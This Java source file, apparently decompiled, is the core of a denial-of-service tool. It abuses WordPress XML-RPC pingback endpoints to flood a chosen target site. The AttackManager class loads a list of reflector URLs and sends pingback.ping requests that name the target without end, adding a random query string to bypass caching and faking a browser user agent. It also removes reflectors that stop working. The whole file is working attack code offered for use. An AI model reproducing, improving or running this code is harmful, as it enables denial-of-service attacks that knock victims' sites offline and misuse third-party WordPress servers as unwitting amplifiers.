package org;

import java.util.logging.*;
import java.util.*;
import java.net.*;
import java.io.*;

public final class AttackManager implements Runnable
{
    private static final List<Link> attackLinks;
    private static final Logger logger;
    
    static {
        attackLinks = Collections.synchronizedList(new LinkedList<Link>());
        logger = Logger.getLogger(AttackManager.class.getName());
    }
    
    public static void load(final String list) {
        AttackManager.logger.info("Loading attack links...");
        try {
            final BufferedReader br = new BufferedReader(new FileReader(list));
            String line = null;
            while ((line = br.readLine()) != null) {
                if (!line.contains("<") && !line.contains(">") && !line.contains("%")) {
                    final String[] input = line.split(" ");
                    if (input.length != 2) {
                        continue;
                    }
                    AttackManager.attackLinks.add(new Link(input[0], input[1]));
                }
            }
            br.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        AttackManager.logger.info("Loaded " + AttackManager.attackLinks.size() + " attack links.");
    }
    
    public void run() {
        while (true) {
            final Link link = AttackManager.attackLinks.get((int)(Math.random() * AttackManager.attackLinks.size()));
            try {
                final HttpURLConnection connection = (HttpURLConnection)new URL(link.getXmlRpcUrl()).openConnection();
                final String payload = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>" + Main.target + "?=" + (int)(Math.random() * 2.147483647E9) + "</string></value></param><param><value><string>" + link.getPostUrl() + "</string></value></param></params></methodCall>";
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "text/xml");
                connection.setRequestProperty("Content-Length", Integer.toString(payload.length()));
                connection.setRequestProperty("Content", payload);
                connection.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
                connection.setRequestProperty("Connection", "close");
                connection.setDoOutput(true);
                final DataOutputStream out = new DataOutputStream(connection.getOutputStream());
                out.writeBytes(payload);
                out.flush();
                out.close();
                final BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                final long before = System.currentTimeMillis();
                String line;
                while ((line = reader.readLine()) != null && System.currentTimeMillis() - before < 2000L) {
                    if (line.contains("cannot") || line.contains("fault")) {
                        link.setErrors(link.getErrors() + 1);
                        break;
                    }
                }
                connection.disconnect();
            }
            catch (Throwable t) {
                link.setErrors(link.getErrors() + 1);
            }
            if (link.getErrors() >= 2) {
                AttackManager.attackLinks.remove(link);
            }
        }
    }
    
    public static class Link
    {
        private final String xmlrpcUrl;
        private final String postUrl;
        private int errors;
        
        public Link(final String xmlrpc, final String postUrl) {
            super();
            this.errors = 0;
            this.xmlrpcUrl = xmlrpc;
            this.postUrl = postUrl;
        }
        
        public String getXmlRpcUrl() {
            return this.xmlrpcUrl;
        }
        
        public String getPostUrl() {
            return this.postUrl;
        }
        
        public int getErrors() {
            return this.errors;
        }
        
        public void setErrors(final int errors) {
            this.errors = errors;
        }
    }
}
